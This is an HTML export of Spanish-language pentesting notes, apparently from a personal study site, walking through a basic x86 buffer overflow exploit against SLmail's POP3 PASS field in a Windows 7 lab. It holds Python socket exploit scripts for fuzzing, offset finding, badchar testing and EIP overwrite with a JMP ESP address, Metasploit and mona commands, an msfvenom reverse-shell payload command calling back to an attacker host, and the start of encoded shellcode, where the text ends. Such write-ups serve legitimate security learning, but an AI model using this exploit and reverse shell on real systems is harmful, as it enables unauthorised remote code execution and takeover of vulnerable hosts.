<!DOCTYPE html> <html><head>
		<title>Buffer Overflow básico x86</title>
		<base href="..\..\..\..\..\..\..\../">
		<meta id="root-path" root-path="..\..\..\..\..\..\..\../">
		<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, minimum-scale=1.0, maximum-scale=5.0">
		<meta charset="UTF-8">
		<meta name="description" content="Hacking - Buffer Overflow básico x86">
		<meta property="og:title" content="Buffer Overflow básico x86">
		<meta property="og:description" content="Hacking - Buffer Overflow básico x86">
		<meta property="og:type" content="website">
		<meta property="og:url" content="notes/4.-cybersecurity/redteam/pentesting/systems/4.-advance/buffer-overflow/buffer-overflow-escenarios/buffer-overflow-básico-x86.html">
		<meta property="og:image" content="undefined">
		<meta property="og:site_name" content="Hacking">
		<link rel="alternate" type="application/rss+xml" title="RSS Feed" href="lib/rss.xml"><script async="" id="webpage-script" src="lib/scripts/webpage.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><script type="module" async="" id="graph-view-script" src="lib/scripts/graph-view.js"></script><script async="" id="graph-wasm-script" src="lib/scripts/graph-wasm.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><script async="" id="graph-render-worker-script" src="lib/scripts/graph-render-worker.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><script async="" id="tinycolor-script" src="lib/scripts/tinycolor.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><script async="" id="pixi-script" src="https://cdnjs.cloudflare.com/ajax/libs/pixi.js/7.4.0/pixi.min.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><script async="" id="minisearch-script" src="https://cdn.jsdelivr.net/npm/minisearch@6.3.0/dist/umd/index.min.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><link rel="icon" href="lib/media/favicon.png"><script async="" id="graph-data-script" src="lib/scripts/graph-data.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><style>body{--line-width:40em;--line-width-adaptive:40em;--file-line-width:40em;--sidebar-width:min(20em, 80vw);--collapse-arrow-size:11px;--tree-horizontal-spacing:0.6em;--tree-vertical-spacing:0.6em;--sidebar-margin:12px}.sidebar{height:100%;min-width:calc(var(--sidebar-width) + var(--divider-width-hover));max-width:calc(var(--sidebar-width) + var(--divider-width-hover));font-size:14px;z-index:10;position:relative;overflow:hidden;transition:min-width ease-in-out,max-width ease-in-out;transition-duration:.2s;contain:size}.sidebar-left{left:0}.sidebar-right{right:0}.sidebar.is-collapsed{min-width:0;max-width:0}body.floating-sidebars .sidebar{position:absolute}.sidebar-content{height:100%;min-width:calc(var(--sidebar-width) - var(--divider-width-hover));top:0;padding:var(--sidebar-margin);padding-top:4em;line-height:var(--line-height-tight);background-color:var(--background-secondary);transition:background-color,border-right,border-left,box-shadow;transition-duration:var(--color-fade-speed);transition-timing-function:ease-in-out;position:absolute;display:flex;flex-direction:column}.sidebar:not(.is-collapsed) .sidebar-content{min-width:calc(max(100%,var(--sidebar-width)) - 3px);max-width:calc(max(100%,var(--sidebar-width)) - 3px)}.sidebar-left .sidebar-content{left:0;border-top-right-radius:var(--radius-l);border-bottom-right-radius:var(--radius-l)}.sidebar-right .sidebar-content{right:0;border-top-left-radius:var(--radius-l);border-bottom-left-radius:var(--radius-l)}.sidebar:has(.sidebar-content:empty):has(.topbar-content:empty){display:none}.sidebar-topbar{height:2em;width:var(--sidebar-width);top:var(--sidebar-margin);padding-inline:var(--sidebar-margin);z-index:1;position:fixed;display:flex;align-items:center;transition:width ease-in-out;transition-duration:inherit}.sidebar.is-collapsed .sidebar-topbar{width:calc(2.3em + var(--sidebar-margin) * 2)}.sidebar .sidebar-topbar.is-collapsed{width:0}.sidebar-left .sidebar-topbar{left:0}.sidebar-right .sidebar-topbar{right:0}.topbar-content{overflow:hidden;overflow:clip;width:100%;height:100%;display:flex;align-items:center;transition:inherit}.sidebar.is-collapsed .topbar-content{width:0;transition:inherit}.clickable-icon.sidebar-collapse-icon{background-color:transparent;color:var(--icon-color-focused);padding:0!important;margin:0!important;height:100%!important;width:2.3em!important;margin-inline:0.14em!important;position:absolute}.sidebar-left .clickable-icon.sidebar-collapse-icon{transform:rotateY(180deg);right:var(--sidebar-margin)}.sidebar-right .clickable-icon.sidebar-collapse-icon{transform:rotateY(180deg);left:var(--sidebar-margin)}.clickable-icon.sidebar-collapse-icon svg.svg-icon{width:100%;height:100%}.sidebar-section-header{margin:0 0 1em 0;text-transform:uppercase;letter-spacing:.06em;font-weight:600}body{transition:background-color var(--color-fade-speed) ease-in-out}.webpage-container{display:flex;flex-direction:row;height:100%;width:100%;align-items:stretch;justify-content:center}.document-container{opacity:1;flex-basis:100%;max-width:100%;width:100%;height:100%;display:flex;flex-direction:column;align-items:center;transition:opacity .2s ease-in-out;contain:inline-size}.hide{opacity:0;transition:opacity .2s ease-in-out}.document-container>.markdown-preview-view{margin:var(--sidebar-margin);margin-bottom:0;width:100%;width:-webkit-fill-available;width:-moz-available;width:fill-available;background-color:var(--background-primary);transition:background-color var(--color-fade-speed) ease-in-out;border-top-right-radius:var(--window-radius,var(--radius-m));border-top-left-radius:var(--window-radius,var(--radius-m));overflow-x:hidden!important;overflow-y:auto!important;display:flex!important;flex-direction:column!important;align-items:center!important;contain:inline-size}.document-container>.markdown-preview-view>.markdown-preview-sizer{padding-bottom:80vh!important;width:100%!important;max-width:var(--line-width)!important;flex-basis:var(--line-width)!important;transition:background-color var(--color-fade-speed) ease-in-out;contain:inline-size}.markdown-rendered img:not([width]),.view-content img:not([width]){max-width:100%;outline:0}.document-container>.view-content.embed{display:flex;padding:1em;height:100%;width:100%;align-items:center;justify-content:center}.document-container>.view-content.embed>*{max-width:100%;max-height:100%;object-fit:contain}:has(> :is(.math,table)){overflow-x:auto!important}.document-container>.view-content{overflow-x:auto;contain:content;padding:0;margin:0;height:100%}.scroll-highlight{position:absolute;width:100%;height:100%;pointer-events:none;z-index:1000;background-color:hsla(var(--color-accent-hsl),.25);opacity:0;padding:1em;inset:50%;translate:-50% -50%;border-radius:var(--radius-s)}</style><script defer="">async function loadIncludes(){if("file:"!=location.protocol){let e=document.querySelectorAll("include");for(let t=0;t<e.length;t++){let o=e[t],l=o.getAttribute("src");try{const e=await fetch(l);if(!e.ok){console.log("Could not include file: "+l),o?.remove();continue}let t=await e.text(),n=document.createRange().createContextualFragment(t),i=Array.from(n.children);for(let e of i)e.classList.add("hide"),e.style.transition="opacity 0.5s ease-in-out",setTimeout((()=>{e.classList.remove("hide")}),10);o.before(n),o.remove(),console.log("Included file: "+l)}catch(e){o?.remove(),console.log("Could not include file: "+l,e);continue}}}else{if(document.querySelectorAll("include").length>0){var e=document.createElement("div");e.id="error",e.textContent="Web server exports must be hosted on an http / web server to be viewed correctly.",e.style.position="fixed",e.style.top="50%",e.style.left="50%",e.style.transform="translate(-50%, -50%)",e.style.fontSize="1.5em",e.style.fontWeight="bold",e.style.textAlign="center",document.body.appendChild(e),document.querySelector(".document-container")?.classList.remove("hide")}}}document.addEventListener("DOMContentLoaded",(()=>{loadIncludes()}));let isFileProtocol="file:"==location.protocol;function waitLoadScripts(e,t){let o=e.map((e=>document.getElementById(e+"-script"))),l=0;!function e(){let n=o[l];l++,n&&"true"!=n.getAttribute("loaded")||l<o.length&&e(),l<o.length?n.addEventListener("load",e):t()}()}</script><link rel="stylesheet" href="lib/styles/obsidian.css"><link rel="stylesheet" href="lib/styles/theme.css"><link rel="preload" href="lib/styles/global-variable-styles.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><noscript><link rel="stylesheet" href="lib/styles/global-variable-styles.css"></noscript><link rel="preload" href="lib/styles/main-styles.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><noscript><link rel="stylesheet" href="lib/styles/main-styles.css"></noscript></head><body class="publish css-settings-manager theme-dark show-inline-title"><script defer="">let theme=localStorage.getItem("theme")||(window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light");"dark"==theme?(document.body.classList.add("theme-dark"),document.body.classList.remove("theme-light")):(document.body.classList.add("theme-light"),document.body.classList.remove("theme-dark")),window.innerWidth<480?document.body.classList.add("is-phone"):window.innerWidth<768?document.body.classList.add("is-tablet"):window.innerWidth<1024?document.body.classList.add("is-small-screen"):document.body.classList.add("is-large-screen")</script><div class="webpage-container workspace"><div class="sidebar-left sidebar"><div class="sidebar-handle"></div><div class="sidebar-topbar"><div class="topbar-content"><label class="theme-toggle-container" for="theme_toggle"><input class="theme-toggle-input" type="checkbox" id="theme_toggle"><div class="toggle-background"></div></label></div><div class="clickable-icon sidebar-collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" class="svg-icon"><path d="M21 3H3C1.89543 3 1 3.89543 1 5V19C1 20.1046 1.89543 21 3 21H21C22.1046 21 23 20.1046 23 19V5C23 3.89543 22.1046 3 21 3Z"></path><path d="M10 4V20"></path><path d="M4 7H7"></path><path d="M4 10H7"></path><path d="M4 13H7"></path></svg></div></div><div class="sidebar-content"><div class="search-input-container"><input enterkeyhint="search" type="search" spellcheck="false" placeholder="Search..."><div class="search-input-clear-button" aria-label="Clear search"></div></div><include src="lib/html/file-tree.html"></include></div><script defer="">let ls = document.querySelector(".sidebar-left"); ls.classList.add("is-collapsed"); if (window.innerWidth > 768) ls.classList.remove("is-collapsed"); ls.style.setProperty("--sidebar-width", localStorage.getItem("sidebar-left-width"));</script></div><div class="document-container markdown-reading-view hide"><div class="markdown-preview-view markdown-rendered allow-fold-headings allow-fold-lists is-readable-line-width"><style id="MJX-CHTML-styles"></style><div class="markdown-preview-sizer markdown-preview-section"><h1 class="page-title heading inline-title" id="Buffer Overflow básico x86"><p>Buffer Overflow básico x86</p></h1><div><hr></div><div><ul>
<li data-line="0">Tags: <a href="?query=tag:practico" class="tag" target="_blank" rel="noopener">#practico</a> <a href="?query=tag:ejemplificaci%C3%B3n" class="tag" target="_blank" rel="noopener">#ejemplificación</a> </li>
</ul></div><div><hr></div><div class="heading-wrapper"><h1 data-heading="Escenario" class="heading" id="Escenario">Escenario</h1><div class="heading-children"><div><p>Para realizar un Buffer Overflow en una máquina con arquitectura de 32 bits, necesitamos un programa llamado <a data-tooltip-position="top" aria-label="https://www.immunityinc.com/products/debugger/" rel="noopener" class="external-link" href="https://www.immunityinc.com/products/debugger/" target="_blank">Immunity Debugger</a> el cual es un depurador de 32 bits para windows. Por otro lado necesitaremos un script en python llamado <a data-tooltip-position="top" aria-label="https://github.com/corelan/mona" rel="noopener" class="external-link" href="https://github.com/corelan/mona" target="_blank">mona.py</a> para automatizar y facilitar las búsquedas en el inmunity debugger, una vez descargado, este deberá ser movido a la ruta de <strong>C:\LocalFiles\InmunityInc\ImmunityDebugger\PyCommands</strong>. </p></div><div><p>Para practicar todo esto obviamente usamos una <a data-tooltip-position="top" aria-label="https://windows-7-home-premium.uptodown.com/windows" rel="noopener" class="external-link" href="https://windows-7-home-premium.uptodown.com/windows" target="_blank">iso de windows 7 premium</a>. </p></div><div><hr></div></div></div><div class="heading-wrapper"><h1 data-heading="Basic Buffer Overflow x86" class="heading" id="Basic_Buffer_Overflow_x86">Basic Buffer Overflow x86</h1><div class="heading-children"><div><p>Para ejemplificar un caso de explotación de Buffer Overflow x86 BÁSICO se usara el windows 7 premium junto a un programa conocido por su vulnerabilidad BOF en un campo PASS el cual se llama <em>SLmail</em>. </p></div><div><p>Una vez que tengamos la aplicación desplegada, la misma nos abrirá en la maquina windows el puerto <strong>110</strong>, por lo que nos podríamos intentar conectar con <strong>telnet</strong> o <strong>netcat</strong> para intentar ingresar los campos necesarios (USER &amp; PASS).</p></div><div><p>Si nos conectamos (<strong>telnet {ip} 110</strong>) e ingresamos <strong>USER dobliuw</strong> y <strong>PASS test</strong> veremos que nos arroja un error por que las credenciales no son válidas, pero de momento el programa estaría funcionando. Si nos abrimos el <strong>immunity debugger</strong> en el windows <em>attacheando</em> la tarea del <em>slmail</em> podremos ver los registros, la pila, entre otras cosas.</p></div><div><p>La idea es ingresar múltiples caracteres hasta producir un fallo en el programa debido a sobrescribir los valores de la pila y los registros. Una vez logrado el fallo en el mismo comenzamos con el trabajo para buscar el <strong>offset</strong>. Por lo que para todo este trabajo podemos realizar un script en python jugando con <strong>sockets</strong>.</p></div><div><pre class="language-python" tabindex="0"><code class="language-python is-loaded"><span class="token comment">#!/usr/bin/python3 </span>

<span class="token keyword">import</span> socket
<span class="token keyword">import</span> sys 

ip <span class="token operator">=</span> <span class="token string">"192.168.1.34"</span>
port <span class="token operator">=</span> <span class="token number">110</span>

<span class="token keyword">def</span> <span class="token function">bof</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> 
    s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span> <span class="token comment"># Se crea una conexión el la variable s</span>

    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># Nos conectamos a la ip y el puerto dado </span>

    banner <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span> <span class="token comment"># Recibimos la respuesta de 1024 bytes </span>
    
    <span class="token keyword">if</span><span class="token punctuation">(</span>banner<span class="token punctuation">)</span><span class="token punctuation">:</span>
        s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b"USER dobliuw"</span> <span class="token operator">+</span> <span class="token string">b'\r\n'</span><span class="token punctuation">)</span> <span class="token comment">#Envíamos la string "USER dobliuw" en formato byte y "\r\n" es una manera de simular el ENTER</span>
        response <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span>
        s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b"PASS "</span> <span class="token operator">+</span> <span class="token string">b"A"</span><span class="token operator">*</span><span class="token number">5000</span> <span class="token operator">+</span> <span class="token string">b'\r\n'</span><span class="token punctuation">)</span> <span class="token comment"># Envíamos la string "PASS AAAAAAAAAA...." en formato byte, siendo el 5000 la cantidad de caracteres a probar hasta generar el fallo.</span>
        s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    bof<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code><button class="copy-code-button">Copy</button></pre></div><div><p>Una vez encontrado un número el cual ocasione un fallo, en este caso 5000, sabemos que al ingresar esta cantidad el programa corrompe debido a que el bufer asignado para la password es de un tamaño de caracteres menor a estos 5000, por lo que ahora hay que encontrar el <strong>offset</strong>.</p></div><div><pre class="language-bash" tabindex="0"><code class="language-bash is-loaded">/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <span class="token number">5000</span> 
<span class="token comment"># pattern_create.rb es un scrip en rubi el cual recibe una logitud de caracteres creando así un payload para envíar. </span>
</code><button class="copy-code-button">Copy</button></pre></div><div><p>Una vez generada la cadena de bytes a enviar, simplemente tendríamos que mandarlo y ver el valor por el cual se sobrescribe el registro EIP, para luego hacer uso de otra herramienta para obtener la cantidad de caracteres previos antes de que el registro EIP se sobrescriba.</p></div><div><pre class="language-bash" tabindex="0"><code class="language-bash is-loaded"><span class="token comment"># Si el registro EIP marca "7A46317A" debemos ingresarlo junto a un 0x al principio </span>
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x7A46317A
</code><button class="copy-code-button">Copy</button></pre></div><div><p>Esta herramienta nos devuelve un número el cual nos indica la cantidad de caracteres previos a que se sobrescriba el valor del registro EIP. Pudiendo así saber exactamente cuando y como hacer para manipular este mismo a gusto. </p></div><div><p>Una vez conseguido el offset, podríamos actualizar el script: </p></div><div><pre class="language-python" tabindex="0"><code class="language-python is-loaded"><span class="token comment">#!/usr/bin/python3 </span>

<span class="token keyword">import</span> socket
<span class="token keyword">import</span> sys 

ip <span class="token operator">=</span> <span class="token string">"192.168.1.34"</span>
port <span class="token operator">=</span> <span class="token number">110</span>
offset <span class="token operator">=</span> <span class="token number">4654</span>

before_eip <span class="token operator">=</span> <span class="token string">b"A"</span><span class="token operator">*</span>offset
eip <span class="token operator">=</span> <span class="token string">b"BBBB"</span>
after_eip <span class="token operator">=</span> <span class="token string">b"C"</span><span class="token operator">*</span><span class="token number">200</span>

payload <span class="token operator">=</span> <span class="token string">b'PASS '</span> <span class="token operator">+</span> before_eip <span class="token operator">+</span> eip <span class="token operator">+</span> after_eip

<span class="token keyword">def</span> <span class="token function">bof</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> 
    s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>

    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>

    banner <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    
    <span class="token keyword">if</span><span class="token punctuation">(</span>banner<span class="token punctuation">)</span><span class="token punctuation">:</span>
        s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b"USER dobliuw"</span> <span class="token operator">+</span> <span class="token string">b'\r\n'</span><span class="token punctuation">)</span> <span class="token comment">#\r\n manera de simular ENTER</span>
        response <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span>
        s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload <span class="token operator">+</span> <span class="token string">b'\r\n'</span><span class="token punctuation">)</span>
        s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    bof<span class="token punctuation">(</span><span class="token punctuation">)</span>

</code><button class="copy-code-button">Copy</button></pre></div><div><p>Agregando 4654 "A" las cuales sobrescribren y pausan el programa, los siguientes 4 caracteres "B" pertenecerían al registro EIP y posteriormente 200 caracteres "C" para ver como se sobrescribe (En este caso, el registro ESP) </p></div><div><p>De esta manera deberíamos generar un  <strong>byte array</strong>, es decir todas las combinaciones posibles de bytes para posteriormente detectar los <strong>badchars</strong>. </p></div><div><p>Esto lo haríamos con el <strong>immunity debugger</strong> ingresando <em>!mona</em> para abrir el script en python y posteriormente ingresar los comandos: </p></div><div><ul>
<li data-line="0">
<h3 data-heading="**!mona**" class="heading" id="**!mona**"><strong>!mona</strong></h3>
</li>
<li data-line="1">
<h3 data-heading="**!mona config -set workingfolder C:\\Users\\{user}\\Desktop\\{new_dir_name}** (Esto para crear un directorio de trabajo en nuestro escritorio)" class="heading" id="**!mona_config_-set_workingfolder_C:\\Users\\{user}\\Desktop\\{new_dir_name}**_(Esto_para_crear_un_directorio_de_trabajo_en_nuestro_escritorio)"><strong>!mona config -set workingfolder C:\Users\{user}\Desktop\{new_dir_name}</strong> (Esto para crear un directorio de trabajo en nuestro escritorio)</h3>
</li>
<li data-line="2">
<h3 data-heading="**!mona bytearray -cpb &quot;\\0x&quot;** (Para crear un byte array excluyendo el null byte en el directorio de trabajo previamente creado)" class="heading" id="**!mona_bytearray_-cpb_&quot;\\0x&quot;**_(Para_crear_un_byte_array_excluyendo_el_null_byte_en_el_directorio_de_trabajo_previamente_creado)"><strong>!mona bytearray -cpb "\0x"</strong> (Para crear un byte array excluyendo el null byte en el directorio de trabajo previamente creado)</h3>
</li>
</ul></div><div><p>La intención de esto, es que con todo el <strong>byte array</strong> donde en el script previamente ingresamos 200 caracteres "C" para ver que caracteres no salen representados en el stack para a la hora de crear el shellcode evitar los <strong>badchars</strong>. </p></div><div><p>Una vez enviado el <strong>byte array</strong>:</p></div><div><pre class="language-python" tabindex="0"><code class="language-python is-loaded"><span class="token comment"># code .....</span>
before_eip <span class="token operator">=</span> <span class="token string">b"A"</span><span class="token operator">*</span>offset
eip <span class="token operator">=</span> <span class="token string">b"BBBB"</span>
after_eip <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"</span>
<span class="token string">b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"</span>
<span class="token string">b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"</span>
<span class="token string">b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"</span>
<span class="token string">b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"</span>
<span class="token string">b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"</span>
<span class="token string">b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"</span>
<span class="token string">b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"</span><span class="token punctuation">)</span>

payload <span class="token operator">=</span> <span class="token string">b'PASS '</span> <span class="token operator">+</span> before_eip <span class="token operator">+</span> eip <span class="token operator">+</span> after_eip
<span class="token comment"># ..... code</span>
</code><button class="copy-code-button">Copy</button></pre></div><div><p>Veremos en el <strong>immunity debugger</strong> donde se corrompe el payload, para que de esta manera podamos empezar a detectar los <strong>badchars</strong>, si bien podemos hacerlo manual viendo que caracteres corrompen el programa, lo podemos hacer con <strong>mona.py</strong>: </p></div><div><ul>
<li data-line="0">
<h3 data-heading="**!mona compare -a 0x{ESP_value} -f C:\\Users\\{user}\\Desktop\\{new_dir_name}\\bytearray.bin**" class="heading" id="**!mona_compare_-a_0x{ESP_value}_-f_C:\\Users\\{user}\\Desktop\\{new_dir_name}\\bytearray.bin**"><strong>!mona compare -a 0x{ESP_value} -f C:\Users\{user}\Desktop\{new_dir_name}\bytearray.bin</strong></h3>
</li>
</ul></div><div><p>Esto lo que hará sera crear un archivo <strong>compare</strong> en la misma carpeta de trabajo indicada con los <em>badchars</em>.  De esta manera podríamos ir creando el <strong>byte array</strong> excluyendo con mona los bytes que el programa no interpreta como <strong>!mona bytearray -cpb "\x00\x{bad_char}"</strong>.</p></div><div><p>Una vez creado el <strong>byte array</strong> con los <strong>badchars</strong> excluidos, no deberíamos tener ningún problema a la hora de ejecutar nuestro shellcode a futuro. Por lo que en este caso toca encontrar el espacio den memoria que apunte al ESP ya que no podemos apuntar directamente a este y necesitamos apuntara a un registro en memoria que se encarge de realizar un salto al ESP.</p></div><div class="heading-wrapper"><h2 data-heading="Creando el shellcode" class="heading" id="Creando_el_shellcode"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>Creando el shellcode</h2><div class="heading-children"><div><p>Para crear el shellcode lo podemos hacer de manera manual o con herramientas como <strong>msfvenom</strong>.</p></div><div><p><code>msfvenom -p windows/shell_reverse_tcp --platform windows -a x86 LHOST=192.168.1.33 LPORT=443 -f c -e x86/shikata_ga_nai -b '\x00\x0a\x0d' EXITFUNC=thread</code></p></div><div><p>En esta caso con el <strong>-p</strong> indicamos el <em>payload</em>, con <strong>--plaform</strong> claramente la <em>plataforma</em>, con <strong>-a</strong> la <strong>arquitectura</strong> (En este caso 32bits = x86), con <strong>LHOST</strong> nuestra <em>IP</em> de atacante a donde queremos recibir la conexión y con <strong>LPORT</strong> el <em>puerto</em>, con <strong>-f</strong> el <em>formato</em> (Python, C, etc.), con <strong>-e</strong> el <em>encoder</em> a usar (En caso de tener muchos badchars y usar el shikata_ga_nai aveces no podrá encodear todo de una manera optima, en esos caso es mejor no especificar un <em>-e</em> y dejar que msfvenom se encarge de aplicar el más optimo), con <strong>-b</strong> los <em>badchars</em> y el <strong>EXITFUNC=thread</strong> es para que a la hora de terminar la conexión con la consola interactiva no mate el proceso padre (El programa vulnerable a buffer overflow) para no crashear el programa, de esta manera creamos un hilo que a la hora de salir de la consola se mantenga el servicio inicial y solo se termine el nuevo proceso hijo que se abrirá. </p></div><div><p>Una vez creado el shellcode, solo tendríamos que encontrar un <strong>OpCode</strong> para que podamos apuntar al ESP donde esta nuestro shellcode.</p></div><div><p>Para buscar el <em>OpCode</em> podríamos hacer uso de la herramienta <em>nasm_shell.rb</em> para entrar en modo interactivo :</p></div><div><pre class="language-bash" tabindex="0"><code class="language-bash is-loaded">/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb  
<span class="token comment"># Una vez en modo interactivo escribimos los siguiente </span>
jmp ESP 
</code><button class="copy-code-button">Copy</button></pre></div><div><p>Esto nos devolverá el <strong>OpCode</strong> de <strong>jmp ESP</strong> ( FFE4 = \xFF\xE4 ) el cual al no ser una dirección (Solo un OpCode) no debemos darle la vuelta como little endian.</p></div><div><p>Una vez con este <strong>OpCode</strong> haciendo uso de mona con el comando <strong>!mona modules</strong> podremos ver los módulos que se usan en el programa donde tendremos que buscar uno que tenga las 4 primeras columnas en <em>FALSE</em> para buscar (<strong>!mona find -s ""\xFF\xE4" -m {module_name}</strong>) si existe el OpCode <strong>JMP ESP</strong> dentro del modulo, en caso de que existe, devolverá múltiples direcciones de memoria y seleccionaremos una (La cual no tiene que contener badchars).<br>
En algunos casos puede ser que nos diga que se encontraron un total de <em>0 pointers</em>, en este caso podemos hacer uso en lugar de "find" de "findwild" (<em>!mona help findwild</em>) para buscar por instrucciones (<em>!mona findwild -s "JMP ESP"</em>)</p></div><div><p>Ahora nuestro <strong>EIP</strong> tiene que valer esta dirección en memoria encontrada dentro de uno de los módulos donde existe el OpCode dentro en una dirección en particular, la cual copiamos y representamos en little endian o, si estamos en python, con la librería <em>struct</em> la función <em>pack</em>.</p></div><div><pre class="language-python" tabindex="0"><code class="language-python is-loaded"><span class="token comment">#!/usr/bin/python3 </span>

<span class="token keyword">import</span> socket
<span class="token keyword">import</span> sys 
<span class="token keyword">from</span> struct <span class="token keyword">import</span> pack 
ip <span class="token operator">=</span> <span class="token string">"192.168.1.34"</span>
port <span class="token operator">=</span> <span class="token number">110</span>
offset <span class="token operator">=</span> <span class="token number">4654</span>

before_eip <span class="token operator">=</span> <span class="token string">b"A"</span><span class="token operator">*</span>offset
eip <span class="token operator">=</span> pack<span class="token punctuation">(</span><span class="token string">"&lt;L"</span><span class="token punctuation">,</span> <span class="token number">0x5f4a358f</span><span class="token punctuation">)</span> <span class="token comment"># "&lt;L" para indicar que es littel endian (5f4a358f es una de las direcciones donde se encontro el OpCode JMP ESP del modulo seleccionado)</span>
shellcode <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">b"\xbd\xb9\xba\x5a\xae\xd9\xe5\xd9\x74\x24\xf4\x5f\x33\xc9"</span>
<span class="token string">b"\xb1\x52\x31\x6f\x12\x83\xc7\x04\x03\xd6\xb4\xb8\x5b\xd4"</span>
<span class="token string">b"\x21\xbe\xa4\x24\xb2\xdf\x2d\xc1\x83\xdf\x4a\x82\xb4\xef"</span>
<span class="token string">b"\x19\xc6\x38\x9b\x4c\xf2\xcb\xe9\x58\xf5\x7c\x47\xbf\x38"</span>
<span class="token string">b"\x7c\xf4\x83\x5b\xfe\x07\xd0\xbb\x3f\xc8\x25\xba\x78\x35"</span>
<span class="token string">b"\xc7\xee\xd1\x31\x7a\x1e\x55\x0f\x47\x95\x25\x81\xcf\x4a"</span>
<span class="token string">b"\xfd\xa0\xfe\xdd\x75\xfb\x20\xdc\x5a\x77\x69\xc6\xbf\xb2"</span>
